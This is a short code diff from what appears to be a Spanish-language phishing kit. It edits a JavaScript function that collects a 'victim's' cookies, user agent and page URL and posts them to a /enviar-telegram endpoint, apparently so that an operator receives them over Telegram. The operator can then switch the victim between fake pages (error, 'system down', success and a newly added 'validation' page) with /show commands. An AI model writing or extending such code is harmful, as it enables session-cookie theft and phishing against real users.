@@ -93,18 +93,18 @@ function enviarNotificacionPagina() {
 
 
 
-        const mensaje = escapeMarkdownV2(`👀 *Víctima en página de carga*
-🌐 Detalles:
-📱 Dispositivo: ${navigator.userAgent}
-🍪 Cookies: ${document.cookie || 'Sin cookies'}
-🌍 URL: ${window.location.href}
+    const mensaje = escapeMarkdownV2(`👀   *Víctima en página de carga*
+🌐    Detalles  :\n
+📱    Dispositivo:\n ${navigator.userAgent}\n
+🍪    Cookies: ${document.cookie || 'Sin cookies'}\n
+🌍 URL: ${window.location.href}\n
 
-Opciones:
-📝 *Opciones:*  
-➡️ /show pag1 - Dinamica 
-➡️ /show pag2 - Dinamica + Error
+📝 **Opciones:** 
+➡️ /show pag1 - Dinámica 
+➡️ /show pag2 - Dinámica + Error
 ➡️ /show pag3 - Sistema caído
-➡️ /show pag4 - Exitoso `);
+➡️ /show pag4 - Exitoso
+➡️ /show pag5 - Validación `);
 
         // Utilizar el endpoint que agregamos en server.js
         fetch('/enviar-telegram', {
